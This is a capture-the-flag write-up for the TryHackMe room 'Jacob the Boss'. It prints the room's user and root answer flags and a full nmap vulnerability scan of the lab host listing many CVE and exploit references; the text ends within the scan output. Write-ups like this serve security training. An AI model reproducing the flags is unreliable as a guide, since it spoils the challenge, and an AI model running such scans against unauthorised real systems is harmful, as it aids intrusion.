# <div align="center">[Jacob the Boss - Tryhackme Writeup](https://tryhackme.com/room/jacobtheboss)</div>
<div align="center">Find a way in and learn a little more.
</div>
<div align="center">
  <img height=200 width=200 src="https://github.com/user-attachments/assets/ff13492d-fbe8-4cb9-99d0-e2a2553879be"/>
</div>

## Task 1

Well, the flaw that makes up this box is the reproduction found in the production environment of a customer a while ago, the verification in season consisted of two steps, the last one within the environment, we hit it head-on and more than 15 machines were vulnerable that together with the development team we were able to correct and adapt.

*First of all, add the jacobtheboss.box address to your hosts file.*

Anyway, learn a little more, have fun!

Answer the questions below

### user.txt
```
f4d491f280de360cc49e26ca1587cbcc
```

### root.txt
```
29a5641eaa0c01abe5749608c8232806
```

## Initial Enumeration

I started with a full port and service scan using version detection and vulnerability scripts to quickly map the attack surface and gather deeper insights.

```
nmap -sV --script=vuln  10.48.179.33

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4: 
|     	DF059135-2CF5-5441-8F22-E6EF1DEE5F6E	10.0	https://vulners.com/gitee/DF059135-2CF5-5441-8F22-E6EF1DEE5F6E	*EXPLOIT*
|     	PACKETSTORM:173661	9.8	https://vulners.com/packetstorm/PACKETSTORM:173661	*EXPLOIT*
|     	F0979183-AE88-53B4-86CF-3AF0523F3807	9.8	https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807	*EXPLOIT*
|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
|     	B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23	*EXPLOIT*
|     	8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623	*EXPLOIT*
|     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	*EXPLOIT*
|     	6192C35D-F78B-5C0A-AB8D-9826A79A5320	9.8	https://vulners.com/githubexploit/6192C35D-F78B-5C0A-AB8D-9826A79A5320	*EXPLOIT*
|     	2227729D-6700-5C8F-8930-1EEAFD4B9FF0	9.8	https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0	*EXPLOIT*
|     	0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587	*EXPLOIT*
|     	BA3887BD-F579-53B1-A4A4-FF49E953E1C0	8.1	https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0	*EXPLOIT*
|     	4FB01B00-F993-5CAF-BD57-D7E290D10C1F	8.1	https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F	*EXPLOIT*
|     	CVE-2020-15778	7.8	https://vulners.com/cve/CVE-2020-15778
|     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	7.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	*EXPLOIT*
|     	991D2CC4-0E09-5745-97A2-4917461BD6EC	7.8	https://vulners.com/githubexploit/991D2CC4-0E09-5745-97A2-4917461BD6EC	*EXPLOIT*
|     	2E719186-2FED-58A8-A150-762EFBAAA523	7.8	https://vulners.com/gitee/2E719186-2FED-58A8-A150-762EFBAAA523	*EXPLOIT*
|     	23CC97BE-7C95-513B-9E73-298C48D74432	7.8	https://vulners.com/githubexploit/23CC97BE-7C95-513B-9E73-298C48D74432	*EXPLOIT*
|     	10213DBE-F683-58BB-B6D3-353173626207	7.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576*EXPLOIT*
|     	CVE-2021-41617	7.0	https://vulners.com/cve/CVE-2021-41617
|     	284B94FC-FD5D-5C47-90EA-47900DAD1D1E	7.0	https://vulners.com/githubexploit/284B94FC-FD5D-5C47-90EA-47900DAD1D1E	*EXPLOIT*
|     	PACKETSTORM:189283	6.8	https://vulners.com/packetstorm/PACKETSTORM:189283	*EXPLOIT*
|     	EDB-ID:46516	6.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	6.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2025-26465	6.8	https://vulners.com/cve/CVE-2025-26465
|     	CVE-2019-6110	6.8	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	6.8	https://vulners.com/cve/CVE-2019-6109
|     	9D8432B9-49EC-5F45-BB96-329B1F2B2254	6.8	https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254	*EXPLOIT*
|     	85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	6.8	https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	*EXPLOIT*
|     	1337DAY-ID-39918	6.8	https://vulners.com/zdt/1337DAY-ID-39918*EXPLOIT*
|     	1337DAY-ID-32328	6.8	https://vulners.com/zdt/1337DAY-ID-32328*EXPLOIT*
|     	1337DAY-ID-32009	6.8	https://vulners.com/zdt/1337DAY-ID-32009*EXPLOIT*
|     	D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	6.5	https://vulners.com/githubexploit/D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	*EXPLOIT*
|     	CVE-2023-51385	6.5	https://vulners.com/cve/CVE-2023-51385
|     	C07ADB46-24B8-57B7-B375-9C761F4750A2	6.5	https://vulners.com/githubexploit/C07ADB46-24B8-57B7-B375-9C761F4750A2	*EXPLOIT*
|     	A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	6.5	https://vulners.com/githubexploit/A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	*EXPLOIT*
|     	65B15AA1-2A8D-53C1-9499-69EBA3619F1C	6.5	https://vulners.com/githubexploit/65B15AA1-2A8D-53C1-9499-69EBA3619F1C	*EXPLOIT*
|     	5325A9D6-132B-590C-BDEF-0CB105252732	6.5	https://vulners.com/gitee/5325A9D6-132B-590C-BDEF-0CB105252732	*EXPLOIT*
|     	530326CF-6AB3-5643-AA16-73DC8CB44742	6.5	https://vulners.com/githubexploit/530326CF-6AB3-5643-AA16-73DC8CB44742	*EXPLOIT*
|     	PACKETSTORM:181223	5.9	https://vulners.com/packetstorm/PACKETSTORM:181223	*EXPLOIT*
|     	MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-	5.9	https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-	*EXPLOIT*
|     	FEF0EB06-770B-5ADF-857C-1704B7AC3FE4	5.9	https://vulners.com/githubexploit/FEF0EB06-770B-5ADF-857C-1704B7AC3FE4	*EXPLOIT*
|     	FD2E0EBA-ED84-5304-8862-84BCDEB2F288	5.9	https://vulners.com/githubexploit/FD2E0EBA-ED84-5304-8862-84BCDEB2F288	*EXPLOIT*
|     	EDB-ID:45939	5.9	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	EDB-ID:45233	5.9	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2023-48795	5.9	https://vulners.com/cve/CVE-2023-48795
|     	CVE-2020-14145	5.9	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2019-6111	5.9	https://vulners.com/cve/CVE-2019-6111
|     	CVE-2018-15473	5.9	https://vulners.com/cve/CVE-2018-15473
|     	CNVD-2021-25272	5.9	https://vulners.com/cnvd/CNVD-2021-25272
|     	B96EAFCA-CE3F-51B0-86CF-4EB92B1C4FEF	5.9	https://vulners.com/githubexploit/B96EAFCA-CE3F-51B0-86CF-4EB92B1C4FEF	*EXPLOIT*
|     	721F040C-37BC-59E1-9433-01A2EAC2E755	5.9	https://vulners.com/githubexploit/721F040C-37BC-59E1-9433-01A2EAC2E755	*EXPLOIT*
|     	6D74A425-60A7-557A-B469-1DD96A2D8FF8	5.9	https://vulners.com/githubexploit/6D74A425-60A7-557A-B469-1DD96A2D8FF8	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	FD18B68B-C0A6-562E-A8C8-781B225F15B0	5.3	https://vulners.com/githubexploit/FD18B68B-C0A6-562E-A8C8-781B225F15B0	*EXPLOIT*
|     	E9EC0911-E2E1-52A7-B2F4-D0065C6A3057	5.3	https://vulners.com/githubexploit/E9EC0911-E2E1-52A7-B2F4-D0065C6A3057	*EXPLOIT*
|     	CVE-2018-20685	5.3	https://vulners.com/cve/CVE-2018-20685
|     	CVE-2018-15919	5.3	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2017-15906	5.3	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-20012	5.3	https://vulners.com/cve/CVE-2016-20012
|     	CNVD-2018-20962	5.3	https://vulners.com/cnvd/CNVD-2018-20962
|     	CNVD-2018-20960	5.3	https://vulners.com/cnvd/CNVD-2018-20960
|     	A9E6F50E-E7FC-51D0-9C93-A43461469FA2	5.3	https://vulners.com/githubexploit/A9E6F50E-E7FC-51D0-9C93-A43461469FA2	*EXPLOIT*
|     	A801235B-9835-5BA8-B8FE-23B7FFCABD66	5.3	https://vulners.com/githubexploit/A801235B-9835-5BA8-B8FE-23B7FFCABD66	*EXPLOIT*
|     	8DD1D813-FD5A-5B26-867A-CE7CAC9FEEDF	5.3	https://vulners.com/gitee/8DD1D813-FD5A-5B26-867A-CE7CAC9FEEDF	*EXPLOIT*
|     	4F2FBB06-E601-5EAD-9679-3395D24057DD	5.3	https://vulners.com/githubexploit/4F2FBB06-E601-5EAD-9679-3395D24057DD	*EXPLOIT*
|     	486BB6BC-9C26-597F-B865-D0E904FDA984	5.3	https://vulners.com/githubexploit/486BB6BC-9C26-597F-B865-D0E904FDA984	*EXPLOIT*
|     	2385176A-820F-5469-AB09-C340264F2B2F	5.3	https://vulners.com/gitee/2385176A-820F-5469-AB09-C340264F2B2F	*EXPLOIT*
|     	1337DAY-ID-31730	5.3	https://vulners.com/zdt/1337DAY-ID-31730*EXPLOIT*
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	CVE-2025-32728	4.3	https://vulners.com/cve/CVE-2025-32728
|     	CVE-2021-36368	3.7	https://vulners.com/cve/CVE-2021-36368
|     	CVE-2025-61985	3.6	https://vulners.com/cve/CVE-2025-61985
|     	CVE-2025-61984	3.6	https://vulners.com/cve/CVE-2025-61984
|     	B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	3.6	https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	*EXPLOIT*
|     	4C6E2182-0E99-5626-83F6-1646DD648C57	3.6	https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57	*EXPLOIT*
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937*EXPLOIT*
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-trace: TRACE is enabled
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.48.179.33
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.48.179.33:80/
|     Form id: q
|     Form action: http://jacobtheboss.box/index.php?
|     
|     Path: http://10.48.179.33:80/index.php?
|     Form id: q
|     Form action: http://jacobtheboss.box/index.php?
|     
|     Path: http://10.48.179.33:80/index.php?archive
|     Form id: q
|_    Form action: http://jacobtheboss.box/index.php?
| vulners: 
|   cpe:/a:apache:http_server:2.4.6: 
|     	3E6BA608-776F-5B1F-9BA5-589CD2A5A351	10.0	https://vulners.com/gitee/3E6BA608-776F-5B1F-9BA5-589CD2A5A351	*EXPLOIT*
|     	PACKETSTORM:176334	9.8	https://vulners.com/packetstorm/PACKETSTORM:176334	*EXPLOIT*
|     	PACKETSTORM:171631	9.8	https://vulners.com/packetstorm/PACKETSTORM:171631	*EXPLOIT*
|     	HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6	9.8	https://vulners.com/httpd/HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6
|     	HTTPD:C072933AA965A86DA3E2C9172FFC1569	9.8	https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
|     	HTTPD:A1BBCE110E077FFBF4469D4F06DB9293	9.8	https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
|     	HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D	9.8	https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
|     	HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8	9.8	https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
|     	HTTPD:9AD76A782F4E66676719E36B64777A7A	9.8	https://vulners.com/httpd/HTTPD:9AD76A782F4E66676719E36B64777A7A
|     	HTTPD:650C6B8A1FEAD1FBD1AF9746142659F9	9.8	https://vulners.com/httpd/HTTPD:650C6B8A1FEAD1FBD1AF9746142659F9
|     	HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E	9.8	https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
|     	HTTPD:1F84410918227CC81FA7C000C4F999A3	9.8	https://vulners.com/httpd/HTTPD:1F84410918227CC81FA7C000C4F999A3
|     	HTTPD:156974A46CA46AF26CC4140D00F7EB10	9.8	https://vulners.com/httpd/HTTPD:156974A46CA46AF26CC4140D00F7EB10
|     	EDB-ID:51193	9.8	https://vulners.com/exploitdb/EDB-ID:51193	*EXPLOIT*
|     	D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52	9.8	https://vulners.com/githubexploit/D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52	*EXPLOIT*
|     	CVE-2024-38476	9.8	https://vulners.com/cve/CVE-2024-38476
|     	CVE-2024-38474	9.8	https://vulners.com/cve/CVE-2024-38474
|     	CVE-2023-25690	9.8	https://vulners.com/cve/CVE-2023-25690
|     	CVE-2022-31813	9.8	https://vulners.com/cve/CVE-2022-31813
|     	CVE-2022-23943	9.8	https://vulners.com/cve/CVE-2022-23943
|     	CVE-2022-22720	9.8	https://vulners.com/cve/CVE-2022-22720
|     	CVE-2021-44790	9.8	https://vulners.com/cve/CVE-2021-44790
|     	CVE-2021-39275	9.8	https://vulners.com/cve/CVE-2021-39275
|     	CVE-2021-26691	9.8	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2018-1312	9.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-7679	9.8	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-3169	9.8	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	9.8	https://vulners.com/cve/CVE-2017-3167
|     	CNVD-2024-36391	9.8	https://vulners.com/cnvd/CNVD-2024-36391
|     	CNVD-2024-36388	9.8	https://vulners.com/cnvd/CNVD-2024-36388
|     	CNVD-2022-51061	9.8	https://vulners.com/cnvd/CNVD-2022-51061
|     	CNVD-2022-41640	9.8	https://vulners.com/cnvd/CNVD-2022-41640
|     	CNVD-2022-03225	9.8	https://vulners.com/cnvd/CNVD-2022-03225
|     	CNVD-2021-102386	9.8	https://vulners.com/cnvd/CNVD-2021-102386
|     	B6297446-2DDD-52BA-B508-29A748A5D2CC	9.8	https://vulners.com/githubexploit/B6297446-2DDD-52BA-B508-29A748A5D2CC	*EXPLOIT*
|     	64A540A8-D918-5BEA-8F60-987F97B27A0C	9.8	https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C	*EXPLOIT*
|     	5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	9.8	https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	*EXPLOIT*
|     	3F17CA20-788F-5C45-88B3-E12DB2979B7B	9.8	https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B	*EXPLOIT*
|     	1337DAY-ID-39214	9.8	https://vulners.com/zdt/1337DAY-ID-39214*EXPLOIT*
|     	1337DAY-ID-38427	9.8	https://vulners.com/zdt/1337DAY-ID-38427*EXPLOIT*
|     	0DB60346-03B6-5FEE-93D7-FF5757D225AA	9.8	https://vulners.com/gitee/0DB60346-03B6-5FEE-93D7-FF5757D225AA	*EXPLOIT*
|     	HTTPD:D868A1E68FB46E2CF5486281DCDB59CF	9.1	https://vulners.com/httpd/HTTPD:D868A1E68FB46E2CF5486281DCDB59CF
|     	HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6	9.1	https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
|     	HTTPD:2C227652EE0B3B961706AAFCACA3D1E1	9.1	https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
|     	FD2EE3A5-BAEA-5845-BA35-E6889992214F	9.1	https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F	*EXPLOIT*
|     	FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7	9.1	https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7	*EXPLOIT*
|     	E606D7F4-5FA2-5907-B30E-367D6FFECD89	9.1	https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89	*EXPLOIT*
|     	D8A19443-2A37-5592-8955-F614504AAF45	9.1	https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45	*EXPLOIT*
|     	CVE-2024-40898	9.1	https://vulners.com/cve/CVE-2024-40898
|     	CVE-2024-38475	9.1	https://vulners.com/cve/CVE-2024-38475
|     	CVE-2022-28615	9.1	https://vulners.com/cve/CVE-2022-28615
|     	CVE-2022-22721	9.1	https://vulners.com/cve/CVE-2022-22721
|     	CVE-2017-9788	9.1	https://vulners.com/cve/CVE-2017-9788
|     	CNVD-2024-36387	9.1	https://vulners.com/cnvd/CNVD-2024-36387
|     	CNVD-2024-33814	9.1	https://vulners.com/cnvd/CNVD-2024-33814
|     	CNVD-2022-51060	9.1	https://vulners.com/cnvd/CNVD-2022-51060
|     	CNVD-2022-41638	9.1	https://vulners.com/cnvd/CNVD-2022-41638
|     	B5E74010-A082-5ECE-AB37-623A5B33FE7D	9.1	https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D	*EXPLOIT*
|     	5418A85B-F4B7-5BBD-B106-0800AC961C7A	9.1	https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A	*EXPLOIT*
|     	HTTPD:1B3D546A8500818AAC5B1359FE11A7E4	9.0	https://vulners.com/httpd/HTTPD:1B3D546A8500818AAC5B1359FE11A7E4
|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	9.0	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
|     	CVE-2022-36760	9.0	https://vulners.com/cve/CVE-2022-36760
|     	CVE-2021-40438	9.0	https://vulners.com/cve/CVE-2021-40438
|     	CNVD-2023-30860	9.0	https://vulners.com/cnvd/CNVD-2023-30860
|     	CNVD-2022-03224	9.0	https://vulners.com/cnvd/CNVD-2022-03224
|     	AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C	9.0	https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C	*EXPLOIT*
|     	9D9B3F4D-6B5C-5377-BE39-F1C432C9E457	9.0	https://vulners.com/githubexploit/9D9B3F4D-6B5C-5377-BE39-F1C432C9E457	*EXPLOIT*
|     	8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	9.0	https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	*EXPLOIT*
|     	7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2	9.0	https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2	*EXPLOIT*
|     	36618CA8-9316-59CA-B748-82F15F407C4F	9.0	https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F	*EXPLOIT*
|     	CVE-2025-58098	8.3	https://vulners.com/cve/CVE-2025-58098
|     	CNVD-2021-102387	8.2	https://vulners.com/cnvd/CNVD-2021-102387
|     	B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	8.2	https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	*EXPLOIT*
|     	HTTPD:BA2AA2F9CA78BCC3B836D2041D1E15B6	8.1	https://vulners.com/httpd/HTTPD:BA2AA2F9CA78BCC3B836D2041D1E15B6
|     	HTTPD:B63E69E936F944F114293D6F4AB8D4D6	8.1	https://vulners.com/httpd/HTTPD:B63E69E936F944F114293D6F4AB8D4D6
|     	CVE-2024-38473	8.1	https://vulners.com/cve/CVE-2024-38473
|     	CVE-2017-15715	8.1	https://vulners.com/cve/CVE-2017-15715
|     	CVE-2016-5387	8.1	https://vulners.com/cve/CVE-2016-5387
|     	CNVD-2016-04948	8.1	https://vulners.com/cnvd/CNVD-2016-04948
|     	249A954E-0189-5182-AE95-31C866A057E1	8.1	https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1	*EXPLOIT*
|     	23079A70-8B37-56D2-9D37-F638EBF7F8B5	8.1	https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5	*EXPLOIT*
|     	PACKETSTORM:181038	7.5	https://vulners.com/packetstorm/PACKETSTORM:181038	*EXPLOIT*
|     	MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED-	7.5	https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED-	*EXPLOIT*
|     	HTTPD:F1CFBC9B54DFAD0499179863D36830BB	7.5	https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
|     	HTTPD:D5C9AD5E120B9B567832B4A5DBD97F43	7.5	https://vulners.com/httpd/HTTPD:D5C9AD5E120B9B567832B4A5DBD97F43
|     	HTTPD:C317C7138B4A8BBD54A901D6DDDCB837	7.5	https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
|     	HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F	7.5	https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
|     	HTTPD:B1B0A31C4AD388CC6C575931414173E2	7.5	https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
|     	HTTPD:975FD708E753E143E7DFFC23510F802E	7.5	https://vulners.com/httpd/HTTPD:975FD708E753E143E7DFFC23510F802E
|     	HTTPD:63F2722DB00DBB3F59C40B40F32363B3	7.5	https://vulners.com/httpd/HTTPD:63F2722DB00DBB3F59C40B40F32363B3
|     	HTTPD:6236A32987BAE49DFBF020477B1278DD	7.5	https://vulners.com/httpd/HTTPD:6236A32987BAE49DFBF020477B1278DD
|     	HTTPD:60420623F2A716909480F87DB74EE9D7	7.5	https://vulners.com/httpd/HTTPD:60420623F2A716909480F87DB74EE9D7
|     	HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5	7.5	https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
|     	HTTPD:34AD734658A873D0B091ED78567E6DF4	7.5	https://vulners.com/httpd/HTTPD:34AD734658A873D0B091ED78567E6DF4
|     	HTTPD:348811594B4FDD8579A34C563A16F7F6	7.5	https://vulners.com/httpd/HTTPD:348811594B4FDD8579A34C563A16F7F6
|     	HTTPD:11D4941ECBB2B14842A64574A692D8D1	7.5	https://vulners.com/httpd/HTTPD:11D4941ECBB2B14842A64574A692D8D1
|     	HTTPD:05E6BF2AD317E3658D2938931207AA66	7.5	https://vulners.com/httpd/HTTPD:05E6BF2AD317E3658D2938931207AA66
|     	EDB-ID:42745	7.5	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
|     	EDB-ID:40961	7.5	https://vulners.com/exploitdb/EDB-ID:40961	*EXPLOIT*
|     	CVE-2025-59775	7.5	https://vulners.com/cve/CVE-2025-59775
|     	CVE-2024-47252	7.5	https://vulners.com/cve/CVE-2024-47252
|     	CVE-2024-43394	7.5	https://vulners.com/cve/CVE-2024-43394
|     	CVE-2024-43204	7.5	https://vulners.com/cve/CVE-2024-43204
|     	CVE-2024-42516	7.5	https://vulners.com/cve/CVE-2024-42516
|     	CVE-2024-39573	7.5	https://vulners.com/cve/CVE-2024-39573
|     	CVE-2024-38477	7.5	https://vulners.com/cve/CVE-2024-38477
|     	CVE-2024-38472	7.5	https://vulners.com/cve/CVE-2024-38472
|     	CVE-2023-31122	7.5	https://vulners.com/cve/CVE-2023-31122
|     	CVE-2022-30556	7.5	https://vulners.com/cve/CVE-2022-30556
|     	CVE-2022-29404	7.5	https://vulners.com/cve/CVE-2022-29404
|     	CVE-2022-26377	7.5	https://vulners.com/cve/CVE-2022-26377
|     	CVE-2022-22719	7.5	https://vulners.com/cve/CVE-2022-22719
|     	CVE-2021-34798	7.5	https://vulners.com/cve/CVE-2021-34798
|     	CVE-2021-33193	7.5	https://vulners.com/cve/CVE-2021-33193
|     	CVE-2021-26690	7.5	https://vulners.com/cve/CVE-2021-26690
|     	CVE-2019-0217	7.5	https://vulners.com/cve/CVE-2019-0217
|     	CVE-2018-8011	7.5	https://vulners.com/cve/CVE-2018-8011
|     	CVE-2018-17199	7.5	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-1303	7.5	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-9798	7.5	https://vulners.com/cve/CVE-2017-9798
|     	CVE-2017-15710	7.5	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2016-8743	7.5	https://vulners.com/cve/CVE-2016-8743
|     	CVE-2016-2161	7.5	https://vulners.com/cve/CVE-2016-2161
|     	CVE-2016-0736	7.5	https://vulners.com/cve/CVE-2016-0736
|     	CVE-2006-20001	7.5	https://vulners.com/cve/CVE-2006-20001
|     	CNVD-2025-30836	7.5	https://vulners.com/cnvd/CNVD-2025-30836
|     	CNVD-2025-16614	7.5	https://vulners.com/cnvd/CNVD-2025-16614
|     	CNVD-2025-16613	7.5	https://vulners.com/cnvd/CNVD-2025-16613
|     	CNVD-2025-16612	7.5	https://vulners.com/cnvd/CNVD-2025-16612
|     	CNVD-2025-16609	7.5	https://vulners.com/cnvd/CNVD-2025-16609
|     	CNVD-2024-36393	7.5	https://vulners.com/cnvd/CNVD-2024-36393
|     	CNVD-2024-36390	7.5	https://vulners.com/cnvd/CNVD-2024-36390
|     	CNVD-2024-36389	7.5	https://vulners.com/cnvd/CNVD-2024-36389
|     	CNVD-2024-20839	7.5	https://vulners.com/cnvd/CNVD-2024-20839
|     	CNVD-2023-93320	7.5	https://vulners.com/cnvd/CNVD-2023-93320
|     	CNVD-2023-80558	7.5	https://vulners.com/cnvd/CNVD-2023-80558
|     	CNVD-2022-53584	7.5	https://vulners.com/cnvd/CNVD-2022-53584
|     	CNVD-2022-51058	7.5	https://vulners.com/cnvd/CNVD-2022-51058
|     	CNVD-2022-41639	7.5	https://vulners.com/cnvd/CNVD-2022-41639
|     	CNVD-2022-13199	7.5	https://vulners.com/cnvd/CNVD-2022-13199
|     	CNVD-2022-03223	7.5	https://vulners.com/cnvd/CNVD-2022-03223
|     	CNVD-2019-41283	7.5	https://vulners.com/cnvd/CNVD-2019-41283
|     	CNVD-2019-08945	7.5	https://vulners.com/cnvd/CNVD-2019-08945
|     	CNVD-2017-13906	7.5	https://vulners.com/cnvd/CNVD-2017-13906
|     	CNVD-2016-13233	7.5	https://vulners.com/cnvd/CNVD-2016-13233
|     	CNVD-2016-13232	7.5	https://vulners.com/cnvd/CNVD-2016-13232
|     	CDC791CD-A414-5ABE-A897-7CFA3C2D3D29	7.5	https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29	*EXPLOIT*
